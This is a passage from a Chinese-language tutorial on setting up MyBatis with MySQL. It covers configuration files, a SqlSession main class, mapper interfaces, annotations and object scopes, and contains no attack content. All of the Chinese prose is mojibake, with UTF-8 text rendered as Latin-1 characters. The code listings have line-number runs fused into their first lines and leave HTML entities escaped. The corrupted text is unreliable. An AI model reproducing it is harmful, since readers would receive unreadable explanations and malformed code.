å°„ã€‚ä¾‹å¦‚ä¸Šé¢ last_name å­—æ®µçš„åˆ«åæ˜¯ lastNameï¼Œå‰è€…æ˜¯è¡¨å­—æ®µçš„åç§°ï¼Œåè€…æ˜¯ Java Bean å±æ€§çš„åç§°ã€‚ åœ¨ Maven å­æ¨¡å—ä¸­çš„ src/main/resources ç›®å½•ä¸‹åˆ›å»º db.properties é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«äº†è¿æ¥ MySQL æ•°æ®åº“æ‰€éœ€çš„åŸºç¡€ä¿¡æ¯ 1234dataSource.user=rootdataSource.password=123456dataSource.driverClass=com.mysql.cj.jdbc.DriverdataSource.jdbcUrl=jdbc:mysql://127.0.0.1:3306/mybatis_lesson?characterEncoding=utf8&amp;autoReconnect=true&amp;useSSL=false&amp;useUnicode=true&amp;useJDBCCompliantTimezoneShift=true&amp;useLegacyDatetimeCode=false&amp;serverTimezone=UTC åœ¨ Maven å­æ¨¡å—ä¸­çš„ src/main/resources ç›®å½•ä¸‹åˆ›å»º log4j.properties é…ç½®æ–‡ä»¶ï¼Œåˆ©ç”¨ Log4j æ‰“å° MyBatis çš„ SQL è¯­å¥ 1234567891011121314151617181920212223242526log4j.rootLogger = DEBUG,console### è¾“å‡ºåˆ°æ§åˆ¶å° ###log4j.appender.console = org.apache.log4j.ConsoleAppenderlog4j.appender.console.Target = System.outlog4j.appender.console.layout = org.apache.log4j.PatternLayoutlog4j.appender.console.layout.ConversionPattern = %d{ABSOLUTE} %5p %c{1}:%L - %m%n### è¾“å‡ºåˆ°æ—¥å¿—æ–‡ä»¶ ###log4j.appender.file = org.apache.log4j.DailyRollingFileAppenderlog4j.appender.file.File = ${uplat.root}/WEB-INF/logs/platform.loglog4j.appender.file.DatePattern=_yyyyMMdd\'.log\'#log4j.appender.file.Append = true#log4j.appender.file.Threshold = INFOlog4j.appender.file.layout = org.apache.log4j.PatternLayoutlog4j.appender.file.layout.ConversionPattern =%-d{yyyy-MM-dd HH\\:mm\\:ss} [ %t\\:%r ] - [ %p ] %m%n### æ‰“å°MyBatisçš„SQL ####log4j.logger.com.ibatis=DEBUG#log4j.logger.com.ibatis.common.jdbc.SimpleDataSource=DEBUG#log4j.logger.com.ibatis.common.jdbc.ScriptRunner=DEBUG#log4j.logger.com.ibatis.sqlmap.engine.impl.SqlMapClientDelegate=DEBUGlog4j.logger.java.sql.Connection=DEBUGlog4j.logger.java.sql.Statement=DEBUGlog4j.logger.java.sql.PreparedStatement=DEBUG#log4j.logger.java.sql.ResultSet=DEBUG åœ¨ Maven å­æ¨¡å—ä¸­çš„ src/main/resources ç›®å½•ä¸‹åˆ›å»º MyBatis çš„ä¸»é…ç½®æ–‡ä»¶ mybatis-config.xmlï¼Œå…¶ä¸­åŒ…å«äº† MyBatis çš„æ ¸å¿ƒè®¾ç½®ï¼ŒåŒ…æ‹¬è·å–æ•°æ®åº“è¿æ¥å®ä¾‹çš„æ•°æ®æºï¼ˆDataSourceï¼‰ã€å†³å®šäº‹åŠ¡ä½œç”¨åŸŸå’Œæ§åˆ¶æ–¹å¼çš„äº‹åŠ¡ç®¡ç†å™¨ï¼ˆTransactionManagerï¼‰ä»¥åŠæ³¨å†Œ SQL æ˜ å°„æ–‡ä»¶ 123456789101112131415161718192021222324252627&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE configuration PUBLIC "-//mybatis.org//DTD Config 3.0//EN" "http://mybatis.org/dtd/mybatis-3-config.dtd"&gt;&lt;configuration&gt; &lt;!-- è¯»å–db.propertiesæ–‡ä»¶ --&gt; &lt;properties resource="db.properties" /&gt; &lt;environments default="development"&gt; &lt;environment id="development"&gt; &lt;!-- é…ç½®äº‹åŠ¡ --&gt; &lt;transactionManager type="JDBC" /&gt; &lt;!-- é…ç½®æ•°æ®æº --&gt; &lt;dataSource type="POOLED"&gt; &lt;property name="url" value="${dataSource.jdbcUrl}" /&gt; &lt;property name="username" value="${dataSource.user}" /&gt; &lt;property name="password" value="${dataSource.password}" /&gt; &lt;property name="driver" value="${dataSource.driverClass}" /&gt; &lt;/dataSource&gt; &lt;/environment&gt; &lt;/environments&gt; &lt;!-- SQLæ˜ å°„æ–‡ä»¶ --&gt; &lt;mappers&gt; &lt;mapper resource="com/clay/mybatis/dao/EmployeeMapper.xml" /&gt; &lt;/mappers&gt;&lt;/configuration&gt; åœ¨ Maven å­æ¨¡å—ä¸­åˆ›å»ºä¸»å¯åŠ¨ç±»ï¼Œæ¯ä¸ªåŸºäº MyBatis çš„åº”ç”¨éƒ½æ˜¯ä»¥ä¸€ä¸ª SqlSessionFactory çš„å®ä¾‹ä¸ºæ ¸å¿ƒçš„ï¼ŒSqlSessionFactory çš„å®ä¾‹å¯ä»¥é€šè¿‡ SqlSessionFactoryBuilder è·å¾—ã€‚è€Œ SqlSessionFactoryBuilder åˆ™å¯ä»¥ä» XML é…ç½®æ–‡ä»¶æˆ–ä¸€ä¸ªé¢„å…ˆé…ç½®çš„ Configuration å®ä¾‹æ¥æ„å»ºå‡º SqlSessionFactory å®ä¾‹ã€‚ä» XML æ–‡ä»¶ä¸­æ„å»º SqlSessionFactory çš„å®ä¾‹éå¸¸ç®€å•ï¼Œå»ºè®®ä½¿ç”¨ç±»è·¯å¾„ä¸‹çš„èµ„æºæ–‡ä»¶è¿›è¡Œé…ç½®ã€‚ä½†ä¹Ÿå¯ä»¥ä½¿ç”¨ä»»æ„çš„è¾“å…¥æµï¼ˆInputStreamï¼‰å®ä¾‹ï¼Œæ¯”å¦‚ç”¨æ–‡ä»¶è·¯å¾„å­—ç¬¦ä¸²æˆ– file:// URL æ„é€ çš„è¾“å…¥æµã€‚MyBatis æä¾›äº†ä¸€ä¸ªåå« Resources çš„å·¥å…·ç±»ï¼Œå®ƒåŒ…å«ä¸€äº›å®ç”¨æ–¹æ³•ï¼Œä½¿å¾—ä»ç±»è·¯å¾„æˆ–å…¶å®ƒä½ç½®åŠ è½½èµ„æºæ–‡ä»¶æ›´åŠ å®¹æ˜“ã€‚ 123456789101112131415161718192021222324252627282930313233package com.clay.mybatis;import com.clay.mybatis.bean.Employee;import org.apache.ibatis.io.Resources;import org.apache.ibatis.session.SqlSession;import org.apache.ibatis.session.SqlSessionFactory;import org.apache.ibatis.session.SqlSessionFactoryBuilder;import java.io.IOException;import java.io.InputStream;public class MyBatisApplication { public static void main(String[] args) throws IOException { String resource = "mybatis-config.xml"; InputStream inputStream = Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); SqlSession session = sqlSessionFactory.openSession(); try { // ä½¿ç”¨SqlSessionå®ä¾‹ï¼Œé€šè¿‡å…¨é™å®šåç›´æ¥æ‰§è¡Œå·²ç»æ˜ å°„çš„SQLè¯­å¥ï¼Œå‚æ•°è¯´æ˜å¦‚ä¸‹ï¼š // 1) å…¨é™å®šåï¼ˆSQLæ˜ å°„æ–‡ä»¶ä¸­çš„å‘½åç©ºé—´ + idï¼‰ï¼šstatement Unique identifier matching the statement to use. // 2) æ‰§è¡ŒSQLæ‰€éœ€çš„å‚æ•°ï¼šparameter A parameter object to pass to the statement. Employee employee = session.selectOne("com.clay.mybatis.mapper.EmployeeMapper.selectEmployee", 1); System.out.println(employee); } finally { if (session != null) { session.close(); } } }} MySQL æ•°æ®åº“åˆå§‹åŒ–åœ¨ MySQL é‡Œæ‰§è¡Œä»¥ä¸‹ SQL è¯­å¥åˆ›å»ºæ•°æ®åº“ä¸æ•°æ®åº“è¡¨ï¼Œå¹¶æ’å…¥æµ‹è¯•æ•°æ® 1234567891011CREATE DATABASE `mybatis_lesson` DEFAULT CHARACTER SET utf8mb4;CREATE TABLE `t_employee` ( `id` int(11) NOT NULL AUTO_INCREMENT, `last_name` varchar(255) DEFAULT NULL, `gender` char(1) DEFAULT NULL, `email` varchar(255) DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8;insert into t_employee values(null, \'Jim\',\'1\', \'jim@gmail.com\'); å·¥ç¨‹çš„ç›®å½•ç»“æ„12345678910111213141516171819202122mybatis-shareâ”œâ”€â”€ mybatis-lesson-1â”‚&nbsp;&nbsp; â”œâ”€â”€ pom.xmlâ”‚&nbsp;&nbsp; â””â”€â”€ srcâ”‚&nbsp;&nbsp; â”œâ”€â”€ mainâ”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ javaâ”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ comâ”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ clayâ”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ mybatisâ”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ beanâ”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ Employee.javaâ”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ daoâ”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ EmployeeMapper.xmlâ”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ MyBatisApplication.javaâ”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ resourcesâ”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ db.propertiesâ”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ log4j.propertiesâ”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ mybatis-config.xmlâ”‚&nbsp;&nbsp; â””â”€â”€ testâ”‚&nbsp;&nbsp; â””â”€â”€ javaâ”œâ”€â”€ pom.xmlâ””â”€â”€ README.md ä»£ç æµ‹è¯•æ‰§è¡Œä¸»å¯åŠ¨ç±» MyBatisApplication çš„ main() æ–¹æ³•ï¼Œè‹¥æ‰“å°å‡ºä»¥ä¸‹æ—¥å¿—ä¿¡æ¯ï¼Œåˆ™è¯´æ˜ MyBatis åº”ç”¨æ­£å¸¸è¿è¡Œ 12345678910111213141521:47:20,509 DEBUG LogFactory:105 - Logging initialized using \'class org.apache.ibatis.logging.slf4j.Slf4jImpl\' adapter.21:47:20,550 DEBUG PooledDataSource:363 - PooledDataSource forcefully closed/removed all connections.21:47:20,550 DEBUG PooledDataSource:363 - PooledDataSource forcefully closed/removed all connections.21:47:20,551 DEBUG PooledDataSource:363 - PooledDataSource forcefully closed/removed all connections.21:47:20,551 DEBUG PooledDataSource:363 - PooledDataSource forcefully closed/removed all connections.21:47:20,648 DEBUG JdbcTransaction:137 - Opening JDBC Connection21:47:20,997 DEBUG PooledDataSource:434 - Created connection 1564984895.21:47:20,998 DEBUG JdbcTransaction:101 - Setting autocommit to false on JDBC Connection [com.mysql.cj.jdbc.ConnectionImpl@5d47c63f]21:47:21,005 DEBUG selectEmployee:137 - ==&gt; Preparing: select id, last_name as lastName, gender, email from t_employee where id = ?21:47:21,058 DEBUG selectEmployee:137 - ==&gt; Parameters: 1(Integer)21:47:21,097 DEBUG selectEmployee:137 - &lt;== Total: 11_Jim_1_jim@gmail.com21:47:21,098 DEBUG JdbcTransaction:123 - Resetting autocommit to true on JDBC Connection [com.mysql.cj.jdbc.ConnectionImpl@5d47c63f]21:47:21,099 DEBUG JdbcTransaction:91 - Closing JDBC Connection [com.mysql.cj.jdbc.ConnectionImpl@5d47c63f]21:47:21,099 DEBUG PooledDataSource:391 - Returned connection 1564984895 to pool. é¢å‘æ¥å£ç¼–ç¨‹åœ¨ä¸Šé¢å…¥é—¨æ¡ˆä¾‹çš„ SQL æ˜ å°„æ–‡ä»¶ä¸­ï¼Œç”±äºåœ¨å‘½åç©ºé—´ com.clay.mybatis.mapper.EmployeeMapper é‡Œå®šä¹‰äº†ä¸€ä¸ªåä¸º selectEmployee çš„æ˜ å°„è¯­å¥ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨ Java ä»£ç ä¸­ä½¿ç”¨å…¨é™å®šå com.clay.mybatis.mapper.EmployeeMapper.selectEmployee æ¥è°ƒç”¨å”¯ä¸€çš„ SQL æ˜ å°„è¯­å¥ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 1Employee employee = session.selectOne("com.clay.mybatis.mapper.EmployeeMapper.selectEmployee", 1); MyBatis å¦å¤–è¿˜æä¾›äº†ä¸€ç§é¢å‘æ¥å£çš„ç¼–ç¨‹æ–¹å¼ï¼Œå¯ä»¥ç›´æ¥æ˜ å°„åˆ°åœ¨å‘½åç©ºé—´ä¸­åŒåçš„æ˜ å°„å™¨ç±»ï¼ˆMapper ç±»ï¼‰ï¼Œå¹¶å°†å·²æ˜ å°„çš„ SQL è¯­å¥åŒ¹é…åˆ°å¯¹åº”åç§°ã€å‚æ•°å’Œè¿”å›ç±»å‹çš„æ–¹æ³•ã€‚æœ¬èŠ‚æ‰€éœ€çš„æ¡ˆä¾‹ä»£ç ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ mybatis-lesson-2ã€‚ ç¬¬ä¸€æ­¥ï¼šåˆ›å»º Mapper æ¥å£ç±»ï¼ˆæ˜ å°„å™¨ç±»ï¼‰ 123456789package com.clay.mybatis.dao;import com.clay.mybatis.bean.Employee;public interface EmployeeMapper { public Employee getById(Long id);} ç¬¬äºŒæ­¥ï¼šåœ¨ SQL æ˜ å°„æ–‡ä»¶ä¸­ï¼ŒæŒ‡å®šå‘½åç©ºé—´ä¸º Mapper æ¥å£ç±»çš„å…¨ç±»åï¼ŒåŒæ—¶æŒ‡å®š id çš„å±æ€§å€¼ä¸º Mapper æ¥å£ç±»çš„æ–¹æ³•å 1234567891011&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;&lt;!-- æŒ‡å®šå‘½åç©ºé—´ä¸ºMapperæ¥å£ç±»çš„å…¨ç±»å --&gt;&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getById" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee where id = #{id} &lt;/select&gt;&lt;/mapper&gt; ç¬¬ä¸‰æ­¥ï¼šé€šè¿‡ Mapper æ¥å£ç±»å®ç°å¢åˆ æ”¹æŸ¥æ“ä½œï¼Œå€¼å¾—ä¸€æçš„æ˜¯ï¼ŒMyBatis ä¼šä¸ºæ¯ä¸ª Mapper æ¥å£ç±»è‡ªåŠ¨åˆ›å»ºä¸€ä¸ªä»£ç†å¯¹è±¡ï¼ˆå°† Mapper æ¥å£ç±»ä¸ SQL æ˜ å°„æ–‡ä»¶ç»‘å®šåœ¨ä¸€èµ·ï¼‰ï¼Œæœ€åç”±ä»£ç†å¯¹è±¡å»æ‰§è¡Œå¢åˆ æ”¹æŸ¥æ–¹æ³• 1234567891011121314151617181920public class MyBatisApplication { public static void main(String[] args) throws IOException { String resource = "mybatis-config.xml"; InputStream inputStream = Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); SqlSession session = sqlSessionFactory.openSession(); try { // MyBatisä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªä»£ç†å¯¹è±¡ï¼Œç”±ä»£ç†å¯¹è±¡å»æ‰§è¡Œå¢åˆ æ”¹æŸ¥æ–¹æ³• EmployeeMapper mapper = session.getMapper(EmployeeMapper.class); Employee employee = mapper.getById(1L); System.out.println(employee); } finally { if (session != null) { session.close(); } } }} ç¬¬å››æ­¥ï¼šæ‰§è¡Œä¸»å¯åŠ¨ç±» MyBatisApplication çš„ main() æ–¹æ³•ï¼Œè‹¥æ‰“å°å‡ºä»¥ä¸‹æ—¥å¿—ä¿¡æ¯ï¼Œåˆ™è¯´æ˜ MyBatis åº”ç”¨æ­£å¸¸è¿è¡Œ 12345678910111213141522:13:27,834 DEBUG LogFactory:105 - Logging initialized using \'class org.apache.ibatis.logging.slf4j.Slf4jImpl\' adapter.22:13:27,872 DEBUG PooledDataSource:363 - PooledDataSource forcefully closed/removed all connections.22:13:27,872 DEBUG PooledDataSource:363 - PooledDataSource forcefully closed/removed all connections.22:13:27,873 DEBUG PooledDataSource:363 - PooledDataSource forcefully closed/removed all connections.22:13:27,873 DEBUG PooledDataSource:363 - PooledDataSource forcefully closed/removed all connections.22:13:27,993 DEBUG JdbcTransaction:137 - Opening JDBC Connection22:13:28,262 DEBUG PooledDataSource:434 - Created connection 27319466.22:13:28,262 DEBUG JdbcTransaction:101 - Setting autocommit to false on JDBC Connection [com.mysql.cj.jdbc.ConnectionImpl@1a0dcaa]22:13:28,266 DEBUG getById:137 - ==&gt; Preparing: select id, last_name as lastName, gender, email from t_employee where id = ?22:13:28,304 DEBUG getById:137 - ==&gt; Parameters: 1(Long)22:13:28,330 DEBUG getById:137 - &lt;== Total: 11_Jim_1_jim@gmail.com22:13:28,331 DEBUG JdbcTransaction:123 - Resetting autocommit to true on JDBC Connection [com.mysql.cj.jdbc.ConnectionImpl@1a0dcaa]22:13:28,331 DEBUG JdbcTransaction:91 - Closing JDBC Connection [com.mysql.cj.jdbc.ConnectionImpl@1a0dcaa]22:13:28,332 DEBUG PooledDataSource:391 - Returned connection 27319466 to pool. ä½ å¯èƒ½ä¼šæ³¨æ„åˆ°ï¼Œè¿™ç§æ–¹å¼å’Œç”¨å…¨é™å®šåè°ƒç”¨ Java å¯¹è±¡çš„æ–¹æ³•ç±»ä¼¼ã€‚è¿™æ ·ï¼Œè¯¥å‘½åå°±å¯ä»¥ç›´æ¥æ˜ å°„åˆ°åœ¨å‘½åç©ºé—´ä¸­åŒåçš„æ˜ å°„å™¨ç±»ï¼Œå¹¶å°†å·²æ˜ å°„çš„ select è¯­å¥åŒ¹é…åˆ°å¯¹åº”åç§°ã€å‚æ•°å’Œè¿”å›ç±»å‹çš„æ–¹æ³•ã€‚å› æ­¤ä½ å°±å¯ä»¥åƒä¸Šé¢é‚£æ ·ï¼Œä¸è´¹å¹ç°ä¹‹åŠ›åœ°åœ¨å¯¹åº”çš„æ˜ å°„å™¨æ¥å£è°ƒç”¨æ–¹æ³•ã€‚ç¬¬äºŒç§æ–¹å¼æœ‰å¾ˆå¤šä¼˜åŠ¿ï¼Œé¦–å…ˆå®ƒä¸ä¾èµ–äºå­—ç¬¦ä¸²å­—é¢å€¼ï¼Œä¼šæ›´å®‰å…¨ä¸€ç‚¹ï¼›å…¶æ¬¡ï¼Œå¦‚æœä½ çš„ IDE æœ‰ä»£ç è¡¥å…¨åŠŸèƒ½ï¼Œé‚£ä¹ˆä»£ç è¡¥å…¨å¯ä»¥å¸®ä½ å¿«é€Ÿé€‰æ‹©åˆ°æ˜ å°„å¥½çš„ SQL è¯­å¥ã€‚ è¿›é˜¶ä½¿ç”¨å‘½åç©ºé—´åœ¨ä¹‹å‰ç‰ˆæœ¬çš„ MyBatis ä¸­ï¼Œå‘½åç©ºé—´ï¼ˆNamespacesï¼‰çš„ä½œç”¨å¹¶ä¸å¤§ï¼Œæ˜¯å¯é€‰çš„ã€‚ä½†ç°åœ¨ï¼Œéšç€å‘½åç©ºé—´è¶Šå‘é‡è¦ï¼Œå¿…é¡»æŒ‡å®šå‘½åç©ºé—´ã€‚å‘½åç©ºé—´çš„ä½œç”¨æœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯åˆ©ç”¨æ›´é•¿çš„å…¨é™å®šåæ¥å°†ä¸åŒçš„è¯­å¥éš”ç¦»å¼€æ¥ï¼ŒåŒæ—¶ä¹Ÿä¸ºäº†å®ç°æ¥å£ç»‘å®šã€‚å°±ç®—ä½ è§‰å¾—æš‚æ—¶ç”¨ä¸åˆ°æ¥å£ç»‘å®šï¼Œä½ ä¹Ÿåº”è¯¥éµå¾ªè¿™é‡Œçš„è§„å®šï¼Œä»¥é˜²å“ªå¤©ä½ æ”¹å˜äº†ä¸»æ„ã€‚é•¿è¿œæ¥çœ‹ï¼Œåªè¦å°†å‘½åç©ºé—´ç½®äºåˆé€‚çš„ Java åŒ…å‘½åç©ºé—´ä¹‹ä¸­ï¼Œä½ çš„ä»£ç ä¼šå˜å¾—æ›´åŠ æ•´æ´ï¼Œä¹Ÿæœ‰åˆ©äºä½ æ›´æ–¹ä¾¿åœ°ä½¿ç”¨ MyBatisã€‚ ä¸ºäº†å‡å°‘è¾“å…¥é‡ï¼ŒMyBatis å¯¹æ‰€æœ‰å…·æœ‰åç§°çš„é…ç½®å…ƒç´ ï¼ˆåŒ…æ‹¬è¯­å¥ï¼Œç»“æœæ˜ å°„ï¼Œç¼“å­˜ç­‰ï¼‰ä½¿ç”¨äº†å¦‚ä¸‹çš„å‘½åè§£æè§„åˆ™ï¼š å…¨é™å®šåï¼šæ¯”å¦‚ com.mypackage.MyMapper.selectAllThingsï¼Œå°†è¢«ç›´æ¥ç”¨äºæŸ¥æ‰¾åŠä½¿ç”¨ çŸ­åç§°ï¼šæ¯”å¦‚ selectAllThingsï¼Œå¦‚æœè¯¥åç§°å…¨å±€å”¯ä¸€ä¹Ÿå¯ä»¥ä½œä¸ºä¸€ä¸ªå•ç‹¬çš„å¼•ç”¨ã€‚å¦‚æœä¸å”¯ä¸€ï¼Œæœ‰ä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šçš„ç›¸åŒåç§°ï¼ˆæ¯”å¦‚ com.foo.selectAllThings å’Œ com.bar.selectAllThingsï¼‰ï¼Œé‚£ä¹ˆä½¿ç”¨æ—¶å°±ä¼šäº§ç”ŸçŸ­åç§°ä¸å”¯ä¸€çš„é”™è¯¯ï¼Œè¿™ç§æƒ…å†µä¸‹å°±å¿…é¡»ä½¿ç”¨å…¨é™å®šå å¯¹äºåƒ EmployeeMapper è¿™æ ·çš„æ˜ å°„å™¨ç±»æ¥è¯´ï¼Œè¿˜æœ‰å¦ä¸€ç§æ–¹æ³•æ¥å®Œæˆè¯­å¥æ˜ å°„ã€‚å®ƒä»¬æ˜ å°„çš„è¯­å¥å¯ä»¥ä¸ç”¨ XML æ¥é…ç½®ï¼Œè€Œå¯ä»¥ä½¿ç”¨ Java æ³¨è§£æ¥é…ç½®ã€‚æ¯”å¦‚ï¼Œä¸Šé¢çš„ XML å…¥é—¨ç¤ºä¾‹å¯ä»¥è¢«æ›¿æ¢æˆå¦‚ä¸‹çš„é…ç½®ï¼š 12345678910package com.clay.mybatis.dao;import com.clay.mybatis.bean.Employee;public interface EmployeeMapper { @Select("select id, last_name as lastName, gender, email from t_employee where id = #{id}") public Employee getById(Long id);} ä½¿ç”¨æ³¨è§£æ¥æ˜ å°„ç®€å•è¯­å¥ä¼šä½¿ä»£ç æ˜¾å¾—æ›´åŠ ç®€æ´ï¼Œä½†å¯¹äºç¨å¾®å¤æ‚ä¸€ç‚¹çš„è¯­å¥ï¼ŒJava æ³¨è§£ä¸ä»…åŠ›ä¸ä»å¿ƒï¼Œè¿˜ä¼šè®©ä½ æœ¬å°±å¤æ‚çš„ SQL è¯­å¥æ›´åŠ æ··ä¹±ä¸å ªã€‚ å› æ­¤ï¼Œå¦‚æœä½ éœ€è¦åšä¸€äº›å¾ˆå¤æ‚çš„æ“ä½œï¼Œæœ€å¥½ç”¨ XML æ¥æ˜ å°„è¯­å¥ã€‚é€‰æ‹©ä½•ç§æ–¹å¼æ¥é…ç½®æ˜ å°„ï¼Œä»¥åŠè®¤ä¸ºæ˜¯å¦åº”è¯¥è¦ç»Ÿä¸€æ˜ å°„è¯­å¥å®šä¹‰çš„å½¢å¼ï¼Œå®Œå…¨å–å†³äºä½ å’Œä½ çš„å›¢é˜Ÿã€‚æ¢å¥è¯è¯´ï¼Œæ°¸è¿œä¸è¦æ‹˜æ³¥äºä¸€ç§æ–¹å¼ï¼Œä½ å¯ä»¥å¾ˆè½»æ¾çš„åœ¨åŸºäºæ³¨è§£å’Œ XML çš„è¯­å¥æ˜ å°„æ–¹å¼é—´è‡ªç”±ç§»æ¤å’Œåˆ‡æ¢ã€‚ ä½œç”¨åŸŸï¼ˆScopeï¼‰å’Œç”Ÿå‘½å‘¨æœŸç†è§£ä¸åŒä½œç”¨åŸŸå’Œç”Ÿå‘½å‘¨æœŸç±»åˆ«æ˜¯è‡³å…³é‡è¦çš„ï¼Œå› ä¸ºé”™è¯¯çš„ä½¿ç”¨ä¼šå¯¼è‡´éå¸¸ä¸¥é‡çš„å¹¶å‘é—®é¢˜ã€‚ä¾èµ–æ³¨å…¥æ¡†æ¶å¯ä»¥åˆ›å»ºçº¿ç¨‹å®‰å…¨çš„ã€åŸºäºäº‹åŠ¡çš„ SqlSession å’Œæ˜ å°„å™¨ï¼Œå¹¶å°†å®ƒä»¬ç›´æ¥æ³¨å…¥åˆ°ä½ çš„ Bean ä¸­ï¼Œå› æ­¤å¯ä»¥ç›´æ¥å¿½ç•¥å®ƒä»¬çš„ç”Ÿå‘½å‘¨æœŸã€‚å¦‚æœå¯¹å¦‚ä½•é€šè¿‡ä¾èµ–æ³¨å…¥æ¡†æ¶ä½¿ç”¨ MyBatis æ„Ÿå…´è¶£ï¼Œå¯ä»¥ç ”ç©¶ä¸€ä¸‹ MyBatis-Spring æˆ– MyBatis-Guice è¿™ä¸¤ä¸ªå­é¡¹ç›®ã€‚ SqlSessionFactoryBuilderè¿™ä¸ªç±»å¯ä»¥è¢«å®ä¾‹åŒ–ã€ä½¿ç”¨å’Œä¸¢å¼ƒï¼Œä¸€æ—¦åˆ›å»ºäº† SqlSessionFactoryï¼Œå°±ä¸å†éœ€è¦å®ƒäº†ã€‚ å› æ­¤ SqlSessionFactoryBuilder å®ä¾‹çš„æœ€ä½³ä½œç”¨åŸŸæ˜¯æ–¹æ³•ä½œç”¨åŸŸï¼ˆä¹Ÿå°±æ˜¯å±€éƒ¨æ–¹æ³•å˜é‡ï¼‰ã€‚ä½ å¯ä»¥é‡ç”¨ SqlSessionFactoryBuilder æ¥åˆ›å»ºå¤šä¸ª SqlSessionFactory å®ä¾‹ï¼Œä½†æœ€å¥½è¿˜æ˜¯ä¸è¦ä¸€ç›´ä¿ç•™ç€å®ƒï¼Œä»¥ä¿è¯æ‰€æœ‰çš„ XML è§£æèµ„æºå¯ä»¥è¢«é‡Šæ”¾ç»™æ›´é‡è¦çš„äº‹æƒ…ã€‚ SqlSessionFactorySqlSessionFactory ä¸€æ—¦è¢«åˆ›å»ºå°±åº”è¯¥åœ¨åº”ç”¨çš„è¿è¡ŒæœŸé—´ä¸€ç›´å­˜åœ¨ï¼Œæ²¡æœ‰ä»»ä½•ç†ç”±ä¸¢å¼ƒå®ƒæˆ–é‡æ–°åˆ›å»ºå¦ä¸€ä¸ªå®ä¾‹ã€‚ä½¿ç”¨ SqlSessionFactory çš„æœ€ä½³å®è·µæ˜¯åœ¨åº”ç”¨è¿è¡ŒæœŸé—´ä¸è¦é‡å¤åˆ›å»ºå¤šæ¬¡ï¼Œå¤šæ¬¡é‡å»º SqlSessionFactory è¢«è§†ä¸ºä¸€ç§ä»£ç  åä¹ æƒ¯ã€‚å› æ­¤ SqlSessionFactory çš„æœ€ä½³ä½œç”¨åŸŸæ˜¯åº”ç”¨ä½œç”¨åŸŸã€‚æœ‰å¾ˆå¤šæ–¹æ³•å¯ä»¥åšåˆ°ï¼Œæœ€ç®€å•çš„å°±æ˜¯ä½¿ç”¨å•ä¾‹æ¨¡å¼æˆ–è€…é™æ€å•ä¾‹æ¨¡å¼ã€‚ SqlSessionæ¯ä¸ªçº¿ç¨‹éƒ½åº”è¯¥æœ‰å®ƒè‡ªå·±çš„ SqlSession å®ä¾‹ã€‚SqlSession çš„å®ä¾‹ä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œå› æ­¤æ˜¯ä¸èƒ½è¢«å…±äº«çš„ï¼Œæ‰€ä»¥å®ƒçš„æœ€ä½³çš„ä½œç”¨åŸŸæ˜¯è¯·æ±‚æˆ–æ–¹æ³•ä½œç”¨åŸŸã€‚ç»å¯¹ä¸èƒ½å°† SqlSession å®ä¾‹çš„å¼•ç”¨æ”¾åœ¨ä¸€ä¸ªç±»çš„é™æ€åŸŸï¼Œç”šè‡³ä¸€ä¸ªç±»çš„å®ä¾‹å˜é‡ä¹Ÿä¸è¡Œã€‚ä¹Ÿç»ä¸èƒ½å°† SqlSession å®ä¾‹çš„å¼•ç”¨æ”¾åœ¨ä»»ä½•ç±»å‹çš„æ‰˜ç®¡ä½œç”¨åŸŸä¸­ï¼Œæ¯”å¦‚ Servlet æ¡†æ¶ä¸­çš„ HttpSessionã€‚å¦‚æœä½ ç°åœ¨æ­£åœ¨ä½¿ç”¨ä¸€ç§ Web æ¡†æ¶ï¼Œå¯ä»¥è€ƒè™‘å°† SqlSession æ”¾åœ¨ä¸€ä¸ªå’Œ HTTP è¯·æ±‚ç›¸ä¼¼çš„ä½œç”¨åŸŸä¸­ã€‚æ¢å¥è¯è¯´ï¼Œæ¯æ¬¡æ”¶åˆ° HTTP è¯·æ±‚ï¼Œå°±å¯ä»¥æ‰“å¼€ä¸€ä¸ª 